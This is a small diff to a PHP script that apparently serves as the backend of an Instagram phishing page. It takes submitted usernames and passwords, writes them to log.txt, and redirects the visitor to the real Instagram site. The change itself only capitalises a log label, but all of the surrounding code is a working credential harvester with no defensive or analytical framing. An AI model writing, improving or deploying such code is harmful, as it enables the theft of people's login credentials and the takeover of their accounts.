@@ -5,7 +5,7 @@ $password = $_POST["password"];
 
 $fp = fopen("log.txt", "a");
 fwrite($fp,"Username: " . $username);
-fwrite($fp,"password: " . $password);
+fwrite($fp,"Password: " . $password);
 fclose($fp);
 
 header("Location: https://instagram.com");
